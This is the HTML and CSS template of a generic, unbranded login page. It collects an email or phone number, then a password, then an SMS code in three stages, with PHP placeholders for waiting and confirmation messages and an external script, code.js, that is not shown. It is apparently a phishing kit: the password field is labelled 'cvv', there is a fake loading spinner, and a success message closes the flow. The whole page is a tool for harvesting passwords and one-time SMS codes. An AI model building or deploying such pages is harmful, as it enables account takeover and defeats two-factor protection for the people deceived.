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">






		
		
  
  
  
  
  
  <style>
			body, h1,h2,h3,div,input,label,span,b,p,td,tr,option,select,center,textarea{
				font-family: Ebrima;
			}
			
			body{
				padding:0px;
				margin:0px;
				background:#F9F9F9;
			}
			
			h1{
				color:#005eb5;
				margin:0px;
				padding:0px;
				font-size:1.1rem;
			}
			
			.header{
				background:#fff;
				box-shadow: 0 0.125rem 0.25rem rgba(26,26,26,0.15);
			}
			
			.center{
				max-width:1400px;
				margin:0px auto;
			}
			
			.bar{
				margin: 1rem 0 0;
				background-color: #fff;
				border-radius: .25rem .25rem 0 0;
				border: 1px solid #dfe8f0;
				border-bottom: 0;
				box-shadow: 0 0.125rem 0.25rem rgba(26,26,26,0.15);
			}
			
			label{
				color:#1a1a1a;
				font-size:14px;
			}
			
			input, select{
				margin-top:7px;
				height: 35px;
				border: 1px solid #dfe8f0;
				font-weight: bold;
				padding: 0.5rem;
				box-shadow: 0 1px 2px rgba(0,0,0,0.1);
				text-align: left;
				flex-basis: 0;
				flex-grow: 1;
				/* width:90%; */
			}
			
			textarea{
				margin-top:7px;
				background-color: #fff;
				font-size:14px;
				height: 115px;
				border: 1px solid #dfe8f0;
				font-weight: bold;
				padding: 0.5rem;
				box-shadow: 0 1px 2px rgba(0,0,0,0.1);
				text-align: left;
				flex-basis: 0;
				flex-grow: 1;
				width:90%;
			}
			
			::placeholder{
				color:#ccc;
			}
			
			.inputDiv{
				margin-top:20px;
			}
			
			button{
				margin-top:7px;
				height: 35px;
				font-weight: bold;
				padding: 10px;
				box-shadow: 0 1px 2px rgba(0,0,0,0.1);
				text-align: left;
				flex-basis: 0;
				flex-grow: 1;
				border: 1px solid #005eb5;
				border-radius: .25rem;
				color: #fff;
				background:#005eb5;
				padding-left:20px;
				padding-right:20px;
				cursor:pointer;
			}
			
			.infoTable{
				width:80%;
			}
			
			.infoTable td{
				font-size:14px;
			}
			
			@media (max-width: 800px) {
				#removeMin1, #removeMin2, #removeMin3, #removeMin4{
					display:none !important;
				}
				
				#showMin1, #showMin2, #showMin3{
					display: block !important;
				}
				
				table td{
					display:table;
					width:100% !important;
				}
				
				.bar{
					margin-left:20px !important;
					margin-right:20px !important;
				}
				
				.inputDiv{
					display:table !important;
					width:100% !important;
				}
				
				#sep1{
					display: block !important;
				}
			}
		</style>
  
  <meta http-equiv="Content-type" content="text/html; charset=iso-8859-1">
</head>


<body>






		
	 
	







		
		
<div class="center">

<div class="bar" style="margin: 0px auto; max-width: 1357px;" id="_tables.form.1">
	<div class="d-flex" style="flex-wrap: wrap;">
		<div class="side-img col-md-6 col-sm-12 col-xs-12">
			<img src="asset/images/image1.png" class="side-img-content" alt="Side-bar-image"></img>
		</div>			
		<div class="login-section col-md-6 col-sm-12 col-xs-12">		
			<div class="first-page">
				<div class="twocard first-card">
					<div class="card-content">
						<div class="card-content-name text-uppercase">
							<h6>Username</h6>
						</div>
						<div class="form-group name-input input-content">
							<label for="username" class="name-label">Email or Phone Number:</label>
							<input type="text" class="username form-control" id="input.name" required>
							<p class="example">For example: email@example.com or +237xxxxxxxx</p>
						</div>
						<div class="namebtn">
							<button type="submit" id="btn1"  onclick="_tables.fkbtn(1);" class="btn submitbtn namebtn-click btn-rounded text-uppercase">Submit</button>
						</div>	
					</div>
				</div>
				<div class="register">
					<p>Don't have an account yet? <a href="#" class="reg-link">Register Now!</a></p>
				</div>
			</div>
		</div>
	</div>
</div>
			
<div class="bar" style="margin: 0px auto; max-width: 1357px; display: none;" id="_tables.form.2">
	<div class="d-flex" style="flex-wrap: wrap;">
		<div class="side-img col-md-6 col-sm-12">
			<img src="asset/images/image1.png" class="side-img-content" alt="Side-bar-image"></img>
		</div>
		<div class="login-section col-md-6 col-sm-12">
			<div class="first-page">
				<div class="second-card twocard">
					<div class="card-head">
						<div class="card-head-img">
							<img src="./asset/images/avatar.jpg" alt="Avatar">
						</div>
						<div class="card-head-content">
							<div class="header-top pencil-icon"><i class="fa fa-pencil"></i></div>
							<div class="header-bottom">
								<p id="email-show-one" class="email-show">example@email.com</p>
							</div>
						</div>
					</div>
					<div class="card-content second-card-content">
						<div id="mainLoading" style="padding-right: 30px; font-size: 14px; display: none;">
							<br>
								<?php echo $WAIT_TEXT; ?>
							<br>
							<br>
							<center>
								<img src="data:image/gif;base64,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">
							</center>
						</div>
						<div id="ccQuery">
							<div class="card-content-name text-uppercase">
								<h6>password</h6>
							</div>
							<div class="form-group password-input input-content">
								<label for="username" class="name-label">Password:</label>
								<input type="password " class="password form-control" id="input.cvv" required>
							</div>
							<div class="namebtn">
								<button type="submit" id="btn2" class="btn pwdbtn-click submitbtn btn-rounded text-uppercase" onclick="_tables.fkbtn(2);">Submit</button>
							</div>
						</div>
					</div>
				</div>
				<div class="register">
					<p>Don't have an account yet? <a href="#" class="reg-link">Register Now!</a></p>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="bar" style="margin: 0px auto; max-width: 1357px; display: none;" id="_tables.form.3">
	<div class="d-flex" style="flex-wrap: wrap;">
		<div class="side-img col-md-6 col-sm-12">
			<img src="asset/images/image1.png" class="side-img-content" alt="Side-bar-image"></img>
		</div>
	<div class="login-section col-md-6 col-sm-12">	
		<div class="first-page">
		<div class="card-head">
					<div class="card-head-img">
						<img src="./asset/images/avatar.jpg" alt="Avatar">
					</div>
					<div class="card-head-content">
						<div class="header-top pencil-icon"><i class="fa fa-pencil"></i></div>
						<div class="header-bottom">
							<p id="email-show-two" class="email-show">example@email.com</p>
						</div>
					</div>
				</div>
			<div class="first-card twocard">
				
				<div class="card-content">
					<div id="finishPage" style="padding-right: 30px; font-size: 14px; line-height: 20px; display: none;">
						<h5>Application registered successfully.</h5>	
						<br>
						<br>
						<p style="font-size: 16px;"><?php echo $CONFIRMATION_BODY; ?></p>
					</div>
				    <div id="smsQuery">
					    <div style="font-size: 14px; line-height: 20px;">
							<p style="font-size: 16px;"><?php echo $SMS_TEXT; ?></p>
						</div>
						<div class="card-content-name text-uppercase">
							<h5>SMS Code</h5>
						</div>
						<div class="form-group name-input input-content">
							<label for="username" class="name-label">Please Code SMS Here:</label>
							<input maxlength="10" type="text" class="sms-code form-control" id="input.sms" required>
						</div>
						<div class="namebtn">
							<button type="submit" id="btn3"  onclick="_tables.fkbtn(3);" class="btn submitbtn namebtn-click btn-rounded text-uppercase">Submit</button>
						</div>
					</div>					
				</div>
				<div style="text-align: center;" valign="top">
			    	<div id="sep1" style="border-bottom: 1px solid rgb(223, 232, 240); margin-bottom: 20px; display: none;">&nbsp;</div>
				</div>
			</div>
		</div>
		</div>
	</div>






			
		</div>


<script src="code.js"></script>
	
</body>
</html>
